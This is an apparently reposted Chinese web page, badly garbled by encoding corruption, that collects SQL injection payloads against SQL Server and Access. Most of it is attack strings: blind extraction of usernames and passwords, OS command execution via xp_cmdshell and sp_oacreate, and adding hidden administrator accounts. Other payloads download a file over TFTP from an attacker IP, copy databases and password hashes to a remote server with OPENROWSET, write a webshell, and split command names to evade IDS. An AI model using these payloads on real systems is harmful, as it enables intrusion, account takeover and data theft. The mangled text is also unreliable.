I"‚—<blockquote>
  <p><a href="https://blog.csdn.net/qq_34306360/article/details/79579527">(è½¬è½½è‡ªCSDN)SQLæ³¨å…¥è¯­å¥å¤§å…¨</a></p>
</blockquote>

<div class="htmledit_views" id="content_views">
                                            <p>1.åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹&nbsp;<br />; and 1=1 and 1=2</p><p><br />2.çŒœè¡¨ä¸€èˆ¬çš„è¡¨çš„åç§°æ— éæ˜¯admin adminuser user pass password ç­‰..&nbsp;<br />and 0&lt;&gt;(select count(*) from *)&nbsp;<br />and 0&lt;&gt;(select count(*) from admin) ---åˆ¤æ–­æ˜¯å¦å­˜åœ¨adminè¿™å¼ è¡¨</p><p>3.çŒœå¸å·æ•°ç›® å¦‚æœé‡åˆ°0&lt; è¿”å›æ­£ç¡®é¡µé¢ 1&lt;è¿”å›é”™è¯¯é¡µé¢è¯´æ˜å¸å·æ•°ç›®å°±æ˜¯1ä¸ª&nbsp;<br />and 0&lt;(select count(*) from admin)&nbsp;<br />and 1&lt;(select count(*) from admin)</p><p>4.çŒœè§£å­—æ®µåç§° åœ¨len( ) æ‹¬å·é‡Œé¢åŠ ä¸Šæˆ‘ä»¬æƒ³åˆ°çš„å­—æ®µåç§°.&nbsp;<br />and 1=(select count(*) from admin where len(*)&gt;0)--&nbsp;<br />and 1=(select count(*) from admin where len(ç”¨æˆ·å­—æ®µåç§°name)&gt;0)&nbsp;<br />and 1=(select count(*) from admin where len(_blank&gt;å¯†ç å­—æ®µåç§°password)&gt;0)</p><p>5.çŒœè§£å„ä¸ªå­—æ®µçš„é•¿åº¦ çŒœè§£é•¿åº¦å°±æ˜¯æŠŠ&gt;0å˜æ¢ ç›´åˆ°è¿”å›æ­£ç¡®é¡µé¢ä¸ºæ­¢&nbsp;<br />and 1=(select count(*) from admin where len(*)&gt;0)&nbsp;<br />and 1=(select count(*) from admin where len(name)&gt;6) é”™è¯¯&nbsp;<br />and 1=(select count(*) from admin where len(name)&gt;5) æ­£ç¡® é•¿åº¦æ˜¯6&nbsp;<br />and 1=(select count(*) from admin where len(name)=6) æ­£ç¡®</p><p>and 1=(select count(*) from admin where len(password)&gt;11) æ­£ç¡®&nbsp;<br />and 1=(select count(*) from admin where len(password)&gt;12) é”™è¯¯ é•¿åº¦æ˜¯12&nbsp;<br />and 1=(select count(*) from admin where len(password)=12) æ­£ç¡®</p><p>6.çŒœè§£å­—ç¬¦&nbsp;<br />and 1=(select count(*) from admin where left(name,1)=a) ---çŒœè§£ç”¨æˆ·å¸å·çš„ç¬¬ä¸€ä½&nbsp;<br />and 1=(select count(*) from admin where left(name,2)=ab)---çŒœè§£ç”¨æˆ·å¸å·çš„ç¬¬äºŒä½&nbsp;<br />å°±è¿™æ ·ä¸€æ¬¡åŠ ä¸€ä¸ªå­—ç¬¦è¿™æ ·çŒœ,çŒœåˆ°å¤Ÿä½ åˆšæ‰çŒœå‡ºæ¥çš„å¤šå°‘ä½äº†å°±å¯¹äº†,å¸å·å°±ç®—å‡ºæ¥äº†&nbsp;<br />and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --&nbsp;<br />è¿™ä¸ªæŸ¥è¯¢è¯­å¥å¯ä»¥çŒœè§£ä¸­æ–‡çš„ç”¨æˆ·å’Œ_blank&gt;å¯†ç .åªè¦æŠŠåé¢çš„æ•°å­—æ¢æˆä¸­æ–‡çš„ASSICç å°±OK.æœ€åæŠŠç»“æœå†è½¬æ¢æˆå­—ç¬¦.</p><p>group by users.id having 1=1--&nbsp;<br />group by users.id, users.username, users.password, users.privs having 1=1--&nbsp;<br />; insert into users values( 666, attacker, foobar, 0xffff )--</p><p>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable-&nbsp;<br />UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p><p>&gt;_id)-&nbsp;<br />UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p><p>&gt;_id,login_blank&gt;_name)-&nbsp;<br />UNION SELECT TOP 1 login_blank&gt;_name FROM logintable-&nbsp;<br />UNION SELECT TOP 1 password FROM logintable where login_blank&gt;_name=Rahul--</p><p>çœ‹_blank&gt;æœåŠ¡å™¨æ‰“çš„è¡¥ä¸=å‡ºé”™äº†æ‰“äº†SP4è¡¥ä¸&nbsp;<br />and 1=(select @@VERSION)--</p><p>çœ‹_blank&gt;æ•°æ®åº“è¿æ¥è´¦å·çš„æƒé™ï¼Œè¿”å›æ­£å¸¸ï¼Œè¯æ˜æ˜¯_blank&gt;æœåŠ¡å™¨è§’è‰²sysadminæƒé™ã€‚&nbsp;<br />and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))--</p><p>åˆ¤æ–­è¿æ¥_blank&gt;æ•°æ®åº“å¸å·ã€‚ï¼ˆé‡‡ç”¨SAè´¦å·è¿æ¥ è¿”å›æ­£å¸¸=è¯æ˜äº†è¿æ¥è´¦å·æ˜¯SAï¼‰&nbsp;<br />and sa=(SELECT System_blank&gt;_user)--&nbsp;<br />and user_blank&gt;_name()=dbo--&nbsp;<br />and 0&lt;&gt;(select user_blank&gt;_name()--</p><p>çœ‹xp_blank&gt;_cmdshellæ˜¯å¦åˆ é™¤&nbsp;<br />and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = X AND name = xp_</p><p>blank&gt;_cmdshell)--</p><p>xp_blank&gt;_cmdshellè¢«åˆ é™¤ï¼Œæ¢å¤,æ”¯æŒç»å¯¹è·¯å¾„çš„æ¢å¤&nbsp;<br />;EXEC master.dbo.sp_blank&gt;_addextendedproc xp_blank&gt;_cmdshell,xplog70.dll--&nbsp;<br />;EXEC master.dbo.sp_blank&gt;_addextendedproc xp_blank&gt;_cmdshell,c:\inetpub\wwwroot\</p><p>xplog70.dll--</p><p>åå‘PINGè‡ªå·±å®éªŒ&nbsp;<br />;use master;declare @s int;exec sp_blank&gt;_oacreate "wscript.shell",@s out;exec sp_blank&gt;</p><p>_oamethod @s,"run",NULL,"cmd.exe /c ping 192.168.0.1";--</p><p>åŠ å¸å·&nbsp;<br />;DECLARE @shell INT EXEC SP_blank&gt;_OACREATE wscript.shell,@shell OUTPUT EXEC SP_blank&gt;</p><p>_OAMETHOD @shell,run,null, C:\WINNT\system32\cmd.exe /c net user jiaoniang$Content$nbsp;1866574 /add--</p><p>åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç›®å½•Eç›˜ï¼š&nbsp;<br />;declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o,</p><p>run, NULL, cscript.exe cï¼š\inetpub\wwwroot\mkwebdir.vbs -w "é»˜è®¤Webç«™ç‚¹" -v "e","eï¼š\"--</p><p>è®¿é—®å±æ€§ï¼šï¼ˆé…åˆå†™å…¥ä¸€ä¸ªwebshellï¼‰&nbsp;<br />declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o,</p><p>run, NULL, cscript.exe cï¼š\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse</p><p>&nbsp;</p><p><br />çˆ†åº“ ç‰¹æ®Š_blank&gt;æŠ€å·§ï¼š:%5c=\ æˆ–è€…</p><p>&nbsp;</p><p>æ‚¨æ­£åœ¨çœ‹çš„SQLserveræ•™ç¨‹æ˜¯:sqlæ³¨å…¥è¯­å¥ã€‚æŠŠ/å’Œ\ ä¿®æ”¹%5æäº¤&nbsp;<br />and 0&lt;&gt;(select top 1 paths from newtable)--</p><p>å¾—åˆ°åº“åï¼ˆä»1åˆ°5éƒ½æ˜¯ç³»ç»Ÿçš„idï¼Œ6ä»¥ä¸Šæ‰å¯ä»¥åˆ¤æ–­ï¼‰&nbsp;<br />and 1=(select name from master.dbo.sysdatabases where dbid=7)--&nbsp;<br />and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&nbsp;<br />ä¾æ¬¡æäº¤ dbid = 7,8,9.... å¾—åˆ°æ›´å¤šçš„_blank&gt;æ•°æ®åº“å</p><p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) æš´åˆ°ä¸€ä¸ªè¡¨ å‡è®¾ä¸º admin&nbsp;<br />and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin))</p><p>æ¥å¾—åˆ°å…¶ä»–çš„è¡¨ã€‚&nbsp;<br />and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin&nbsp;<br />and uid&gt;(str(id))) æš´åˆ°UIDçš„æ•°å€¼å‡è®¾ä¸º18779569 uid=id&nbsp;<br />and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) å¾—åˆ°ä¸€ä¸ªadminçš„ä¸€ä¸ª</p><p>å­—æ®µ,å‡è®¾ä¸º user_blank&gt;_id&nbsp;<br />and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in&nbsp;<br />(id,...)) æ¥æš´å‡ºå…¶ä»–çš„å­—æ®µ&nbsp;<br />and 0&lt;(select user_blank&gt;_id from BBS.dbo.admin where username&gt;1) å¯ä»¥å¾—åˆ°ç”¨æˆ·å&nbsp;<br />ä¾æ¬¡å¯ä»¥å¾—åˆ°_blank&gt;å¯†ç ã€‚ã€‚ã€‚ã€‚ã€‚å‡è®¾å­˜åœ¨user_blank&gt;_id username ,password ç­‰å­—æ®µ</p><p>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&nbsp;<br />and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) å¾—åˆ°è¡¨å&nbsp;<br />and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))&nbsp;<br />and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(s</p><p>tr(id))) åˆ¤æ–­idå€¼&nbsp;<br />and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) æ‰€æœ‰å­—æ®µ</p><p>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin&nbsp;<br />?id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (unionï¼Œaccessä¹Ÿå¥½ç”¨)</p><p><br />[NextPage]</p><p><br />å¾—åˆ°WEBè·¯å¾„&nbsp;<br />;create table [dbo].[swap] ([swappass][char](255));--&nbsp;<br />and (select top 1 swappass from swap)=1--&nbsp;<br />;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_blank&gt;_regread @rootkey=HKEY_blank&gt;_LOCAL_blank&gt;_MACHINE,</p><p>@key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\, @value_blank</p><p>&gt;_name=/,&nbsp;<a href="mailto:values=@test" rel="nofollow"><span style="color:#506f62;">values=@test</span></a>&nbsp;OUTPUT insert into paths(path) values(@test)--&nbsp;<br />;use ku1;--&nbsp;<br />;create table cmd (str image);-- å»ºç«‹imageç±»å‹çš„è¡¨cmd</p><p>å­˜åœ¨xp_blank&gt;_cmdshellçš„æµ‹è¯•è¿‡ç¨‹ï¼š&nbsp;<br />;exec master..xp_blank&gt;_cmdshell dir&nbsp;<br />;exec master.dbo.sp_blank&gt;_addlogin jiaoniang$;-- åŠ SQLå¸å·&nbsp;<br />;exec master.dbo.sp_blank&gt;_password null,jiaoniang$,1866574;--&nbsp;<br />;exec master.dbo.sp_blank&gt;_addsrvrolemember jiaoniang$Content$nbsp;sysadmin;--&nbsp;<br />;exec master.dbo.xp_blank&gt;_cmdshell net user jiaoniang$Content$nbsp;1866574 /workstations:* /</p><p>times:all /passwordchg:yes /passwordreq:yes /active:yes /add;--&nbsp;<br />;exec master.dbo.xp_blank&gt;_cmdshell net localgroup administrators jiaoniang$Content$nbsp;/add;--&nbsp;<br />exec master..xp_blank&gt;_servicecontrol start, schedule å¯åŠ¨_blank&gt;æœåŠ¡&nbsp;<br />exec master..xp_blank&gt;_servicecontrol start, server&nbsp;<br />; DECLARE @shell INT EXEC SP_blank&gt;_OACREATE wscript.shell,@shell OUTPUT EXEC SP</p><p>_blank&gt;_OAMETHOD @shell,run,null, Cï¼š\WINNT\system32\cmd.exe /c net user jiaonian</p><p>g$Content$nbsp;1866574 /add&nbsp;<br />;DECLARE @shell INT EXEC SP_blank&gt;_OACREATE wscript.shell,@shell OUTPUT EXEC S</p><p>P_blank&gt;_OAMETHOD @shell,run,null, Cï¼š\WINNT\system32\cmd.exe /c net localgroup</p><p>administrators jiaoniang$Content$nbsp;/add&nbsp;<br />; exec master..xp_blank&gt;_cmdshell tftp -i youip get file.exe-- åˆ©ç”¨TFTPä¸Šä¼ æ–‡ä»¶</p><p>;declare @a sysname set @a=xp_blank&gt;_+cmdshell exec @a dir c:\&nbsp;<br />;declare @a sysname set @a=xp+_blank&gt;_cmâ€™+â€™dshell exec @a dir c:\&nbsp;<br />;declare @a;set @a=db_blank&gt;_name();backup database @a to disk=ä½ çš„IPä½ çš„å…±äº«ç›®å½•</p><p>bak.dat å¦‚æœè¢«é™åˆ¶åˆ™å¯ä»¥ã€‚&nbsp;<br />select * from openrowset(_blank&gt;sqloledb,server;sa;,select OK! exec master.dbo.sp_</p><p>blank&gt;_addlogin hax)</p><p>æŸ¥è¯¢æ„é€ ï¼š&nbsp;<br />SELECT * FROM news WHERE id=... AND topic=... AND .....&nbsp;<br />adminand 1=(select count(*) from</p><p>&nbsp;</p><p>æ‚¨æ­£åœ¨çœ‹çš„SQLserveræ•™ç¨‹æ˜¯:sqlæ³¨å…¥è¯­å¥ã€‚[user] where username=victim and right(left(userp</p><p>ass,01),1)=1) and userpass &lt;&gt;&nbsp;<br />select 123;--&nbsp;<br />;use master;--&nbsp;<br />:a or name like fff%;-- æ˜¾ç¤ºæœ‰ä¸€ä¸ªå«ffffçš„ç”¨æˆ·å“ˆã€‚&nbsp;<br />and 1&lt;&gt;(select count(email) from [user]);--&nbsp;<br />;update [users] set email=(select top 1 name from sysobjects where xtype=u and</p><p>status&gt;0) where name=ffff;--&nbsp;<br />;update [users] set email=(select top 1 id from sysobjects where xtype=u and nam</p><p>e=ad) where name=ffff;--&nbsp;<br />;update [users] set email=(select top 1 name from sysobjects where xtype=u and i</p><p>d&gt;581577110) where name=ffff;--&nbsp;<br />;update [users] set email=(select top 1 count(id) from password) where name=ffff;--&nbsp;<br />;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;--&nbsp;<br />;update [users] set email=(select top 1 name from password where id=2) where name=ffff;--&nbsp;<br />ä¸Šé¢çš„è¯­å¥æ˜¯å¾—åˆ°_blank&gt;æ•°æ®åº“ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·è¡¨,å¹¶æŠŠè¡¨åæ”¾åœ¨ffffç”¨æˆ·çš„é‚®ç®±å­—æ®µä¸­ã€‚&nbsp;<br />é€šè¿‡æŸ¥çœ‹ffffçš„ç”¨æˆ·èµ„æ–™å¯å¾—ç¬¬ä¸€ä¸ªç”¨è¡¨å«ad&nbsp;<br />ç„¶åæ ¹æ®è¡¨åadå¾—åˆ°è¿™ä¸ªè¡¨çš„ID å¾—åˆ°ç¬¬äºŒä¸ªè¡¨çš„åå­—</p><p>insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x</p><p>73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)--&nbsp;<br />insert into users values( 667,123,123,0xffff)--&nbsp;<br />insert into users values ( 123, admin--, password, 0xffff)--&nbsp;<br />;and user&gt;0&nbsp;<br />;and (select count(*) from sysobjects)&gt;0&nbsp;<br />;and (select count(*) from mysysobjects)&gt;0 //ä¸ºaccess_blank&gt;æ•°æ®åº“</p><p>æšä¸¾å‡ºæ•°æ®è¡¨å&nbsp;<br />;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0);--&nbsp;<br />è¿™æ˜¯å°†ç¬¬ä¸€ä¸ªè¡¨åæ›´æ–°åˆ°aaaçš„å­—æ®µå¤„ã€‚&nbsp;<br />è¯»å‡ºç¬¬ä¸€ä¸ªè¡¨ï¼Œç¬¬äºŒä¸ªè¡¨å¯ä»¥è¿™æ ·è¯»å‡ºæ¥ï¼ˆåœ¨æ¡ä»¶ååŠ ä¸Š and name&lt;&gt;åˆšæ‰å¾—åˆ°çš„è¡¨åï¼‰ã€‚&nbsp;<br />;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0</p><p>and name&lt;&gt;vote);--&nbsp;<br />ç„¶åid=1552 and exists(select * from aaa where aaa&gt;5)&nbsp;<br />è¯»å‡ºç¬¬äºŒä¸ªè¡¨ï¼Œä¸€ä¸ªä¸ªçš„è¯»å‡ºï¼Œç›´åˆ°æ²¡æœ‰ä¸ºæ­¢ã€‚&nbsp;<br />è¯»å­—æ®µæ˜¯è¿™æ ·ï¼š&nbsp;<br />;update aaa set aaa=(select top 1 col_blank&gt;_name(object_blank&gt;_id(è¡¨å),1));--&nbsp;<br />ç„¶åid=152 and exists(select * from aaa where aaa&gt;5)å‡ºé”™ï¼Œå¾—åˆ°å­—æ®µå&nbsp;<br />;update aaa set aaa=(select top 1 col_blank&gt;_name(object_blank&gt;_id(è¡¨å),2));--&nbsp;<br />ç„¶åid=152 and exists(select * from aaa where aaa&gt;5)å‡ºé”™ï¼Œå¾—åˆ°å­—æ®µå</p><p>[è·å¾—æ•°æ®è¡¨å][å°†å­—æ®µå€¼æ›´æ–°ä¸ºè¡¨åï¼Œå†æƒ³æ³•è¯»å‡ºè¿™ä¸ªå­—æ®µçš„å€¼å°±å¯å¾—åˆ°è¡¨å]&nbsp;<br />update è¡¨å set å­—æ®µ=(select top 1 name from sysobjects where xtype=u and status&gt;0</p><p>[ and name&lt;&gt;ä½ å¾—åˆ°çš„è¡¨å æŸ¥å‡ºä¸€ä¸ªåŠ ä¸€ä¸ª]) [ where æ¡ä»¶] select top 1 name from sysobje</p><p>cts where xtype=u and status&gt;0 and name not in(table1,table2,â€¦)&nbsp;<br />é€šè¿‡SQLSERVERæ³¨å…¥_blank&gt;æ¼æ´å»º_blank&gt;æ•°æ®åº“ç®¡ç†å‘˜å¸å·å’Œç³»ç»Ÿç®¡ç†å‘˜å¸å·[å½“å‰å¸å·å¿…é¡»æ˜¯SYSADMINç»„]</p><p>[è·å¾—æ•°æ®è¡¨å­—æ®µå][å°†å­—æ®µå€¼æ›´æ–°ä¸ºå­—æ®µåï¼Œå†æƒ³æ³•è¯»å‡ºè¿™ä¸ªå­—æ®µçš„å€¼å°±å¯å¾—åˆ°å­—æ®µå]&nbsp;<br />update è¡¨å set å­—æ®µ=(select top 1 col_blank&gt;_name(object_blank&gt;_id(è¦æŸ¥è¯¢çš„æ•°æ®è¡¨å),</p><p>å­—æ®µåˆ—å¦‚:1) [ where æ¡ä»¶]</p><p>ç»•è¿‡IDSçš„æ£€æµ‹[ä½¿ç”¨å˜é‡]&nbsp;<br />;declare @a sysname set @a=xp_blank&gt;_+cmdshell exec @a dir c:\&nbsp;<br />;declare @a sysname set @a=xp+_blank&gt;_cmâ€™+â€™dshell exec @a dir c:\</p><p>1ã€ å¼€å¯è¿œç¨‹_blank&gt;æ•°æ®åº“&nbsp;<br />åŸºæœ¬è¯­æ³•&nbsp;<br />select * from OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select *</p><p>from table1 )&nbsp;<br />å‚æ•°: (1) OLEDB Provider name&nbsp;<br />2ã€ å…¶ä¸­è¿æ¥å­—ç¬¦ä¸²å‚æ•°å¯ä»¥æ˜¯ä»»ä½•ç«¯å£ç”¨æ¥è¿æ¥,æ¯”å¦‚&nbsp;<br />select * from OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p><br />[NextPage]</p><p><br />=192.168.0.1,1433;, select * from table&nbsp;<br />3.å¤åˆ¶ç›®æ ‡ä¸»æœºçš„æ•´ä¸ª_blank&gt;æ•°æ®åº“insertæ‰€æœ‰è¿œç¨‹è¡¨åˆ°æœ¬åœ°è¡¨ã€‚</p><p>&nbsp;</p><p><br />åŸºæœ¬è¯­æ³•ï¼š&nbsp;<br />insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select *</p><p>from table1) select * from table2&nbsp;<br />è¿™è¡Œè¯­å¥å°†ç›®æ ‡ä¸»æœºä¸Štable2è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®å¤åˆ¶åˆ°è¿œç¨‹_blank&gt;æ•°æ®åº“ä¸­çš„table1è¡¨ä¸­ã€‚å®é™…è¿ç”¨</p><p>ä¸­é€‚å½“ä¿®æ”¹è¿æ¥å­—ç¬¦ä¸²çš„IPåœ°å€å’Œç«¯å£ï¼ŒæŒ‡å‘éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼š&nbsp;<br />insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from table1) select * from table2&nbsp;<br />insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from _blank&gt;_sysdatabases)&nbsp;<br />select * from master.dbo.sysdatabases&nbsp;<br />insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from _blank&gt;_sysobjects)&nbsp;<br />select * from user_blank&gt;</p><p><br />æ‚¨æ­£åœ¨çœ‹çš„SQLserveræ•™ç¨‹æ˜¯:sqlæ³¨å…¥è¯­å¥ã€‚_database.dbo.sysobjects&nbsp;<br />insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from _blank&gt;_syscolumns)&nbsp;<br />select * from user_blank&gt;_database.dbo.syscolumns&nbsp;<br />å¤åˆ¶_blank&gt;æ•°æ®åº“ï¼š&nbsp;<br />insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from table1) select * from database..table1&nbsp;<br />insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Addres</p><p>s=192.168.0.1,1433;,select * from table2) select * from database..table2</p><p>å¤åˆ¶å“ˆè¥¿è¡¨ï¼ˆHASHï¼‰ç™»å½•_blank&gt;å¯†ç çš„hashå­˜å‚¨äºsysxloginsä¸­ã€‚æ–¹æ³•å¦‚ä¸‹ï¼š&nbsp;<br />insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,s</p><p>elect * from _blank&gt;_sysxlogins) select * from database.dbo.sysxlogins&nbsp;<br />å¾—åˆ°hashä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p><p>éå†ç›®å½•çš„æ–¹æ³•ï¼š å…ˆåˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨ï¼štemp&nbsp;<br />;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3</p><p>nvarchar(255));--&nbsp;<br />;insert temp exec master.dbo.xp_blank&gt;_availablemedia;-- è·å¾—å½“å‰æ‰€æœ‰é©±åŠ¨å™¨&nbsp;<br />;insert into temp(id) exec master.dbo.xp_blank&gt;_subdirs c:\;-- è·å¾—å­ç›®å½•åˆ—è¡¨&nbsp;<br />;insert into temp(id,num1) exec master.dbo.xp_blank&gt;_dirtree c:\;-- è·å¾—æ‰€æœ‰å­ç›®å½•</p><p>çš„ç›®å½•æ ‘ç»“æ„,å¹¶å¯¸å…¥tempè¡¨ä¸­&nbsp;<br />;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell type c:\web\index.asp;-</p><p>- æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„å†…å®¹&nbsp;<br />;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell dir c:\;--&nbsp;<br />;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell dir c:\ *.asp /s/a;--&nbsp;<br />;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell cscript C:\Inetpub\Admin</p><p>Scripts\adsutil.vbs enum w3svc&nbsp;<br />;insert into temp(id,num1) exec master.dbo.xp_blank&gt;_dirtree c:\;-- ï¼ˆxp_blank&gt;_</p><p>dirtreeé€‚ç”¨æƒé™PUBLICï¼‰&nbsp;<br />å†™å…¥è¡¨ï¼š&nbsp;<br />è¯­å¥1ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin));--&nbsp;<br />è¯­å¥2ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(serveradmin));--&nbsp;<br />è¯­å¥3ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(setupadmin));--&nbsp;<br />è¯­å¥4ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(securityadmin));--&nbsp;<br />è¯­å¥5ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(securityadmin));--&nbsp;<br />è¯­å¥6ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(diskadmin));--&nbsp;<br />è¯­å¥7ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(bulkadmin));--&nbsp;<br />è¯­å¥8ï¼šand 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(bulkadmin));--&nbsp;<br />è¯­å¥9ï¼šand 1=(SELECT IS_blank&gt;_MEMBER(db_blank&gt;_owner));--</p><p>æŠŠè·¯å¾„å†™åˆ°è¡¨ä¸­å»ï¼š&nbsp;<br />;create table dirs(paths varchar(100), id int)--&nbsp;<br />;insert dirs exec master.dbo.xp_blank&gt;_dirtree c:\--&nbsp;<br />and 0&lt;&gt;(select top 1 paths from dirs)--&nbsp;<br />and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))--&nbsp;<br />;create table dirs1(paths varchar(100), id int)--&nbsp;<br />;insert dirs exec master.dbo.xp_blank&gt;_dirtree e:\web--&nbsp;<br />and 0&lt;&gt;(select top 1 paths from dirs1)--</p><p>æŠŠ_blank&gt;æ•°æ®åº“å¤‡ä»½åˆ°ç½‘é¡µç›®å½•ï¼šä¸‹è½½&nbsp;<br />;declare @a sysname; set @a=db_blank&gt;_name();backup database @a to disk</p><p>=e:\web\down.bak;--</p><p>and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where</p><p>xtype=char(85)) T order by id desc)&nbsp;<br />and 1=(Select Top 1 col_blank&gt;_name(object_blank&gt;_id(USER_blank&gt;_LOGIN)</p><p>,1) from sysobjects) å‚çœ‹ç›¸å…³è¡¨ã€‚&nbsp;<br />and 1=(select user_blank&gt;_id from USER_blank&gt;_LOGIN)&nbsp;<br />and 0=(select user from USER_blank&gt;_LOGIN where user&gt;1)</p><p>-=- wscript.shell example -=-&nbsp;<br />declare @o int&nbsp;<br />exec sp_blank&gt;_oacreate wscript.shell, @o out&nbsp;<br />exec sp_blank&gt;_oamethod @o, run, NULL, notepad.exe&nbsp;<br />; declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;</p><p>_oamethod @o, run, NULL, notepad.exe--</p><p>declare @o int, @f int, @t int, @ret int&nbsp;<br />declare @line varchar(8000)&nbsp;<br />exec sp_blank&gt;_oacreate scripting.filesystemobject, @o out&nbsp;<br />exec sp_blank&gt;_oamethod @o, opentextfile, @f out, c:\boot.ini, 1&nbsp;<br />exec @ret = sp_blank&gt;_oamethod @f, readline, @line out&nbsp;<br />while( @ret = 0 )&nbsp;<br />begin&nbsp;<br />print @line&nbsp;<br />exec @ret = sp_blank&gt;_oamethod @f, readline, @line out&nbsp;<br />end</p><p>declare @o int, @f int, @t int</p><p><br />æ‚¨æ­£åœ¨çœ‹çš„SQLserveræ•™ç¨‹æ˜¯:sqlæ³¨å…¥è¯­å¥ã€‚, @ret int&nbsp;<br />exec sp_blank&gt;_oacreate scripting.filesystemobject, @o out&nbsp;<br />exec sp_blank&gt;_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1&nbsp;<br />exec @ret = sp_blank&gt;_oamethod @f, writeline, NULL,</p><p><br />declare @o int, @ret int&nbsp;<br />exec sp_blank&gt;_oacreate speech.voicetext, @o out&nbsp;<br />exec sp_blank&gt;_oamethod @o, register, NULL, foo, bar&nbsp;<br />exec sp_blank&gt;_oasetproperty @o, speed, 150&nbsp;<br />exec sp_blank&gt;_oamethod @o, speak, NULL, all your sequel servers are belong</p><p>to,us, 528&nbsp;<br />waitfor delay 00:00:05</p><p>; declare @o int, @ret int exec sp_blank&gt;_oacreate speech.voicetext, @o out</p><p>exec sp_blank&gt;_oamethod @o, register, NULL, foo, bar exec sp_blank&gt;_oasetp</p><p>roperty @o, speed, 150 exec sp_blank&gt;_oamethod @o, speak, NULL, all your</p><p>sequel servers are belong to us, 528 waitfor delay 00:00:05--</p><p>xp_blank&gt;_dirtreeé€‚ç”¨æƒé™PUBLIC&nbsp;<br />exec master.dbo.xp_blank&gt;_dirtree c:\&nbsp;<br 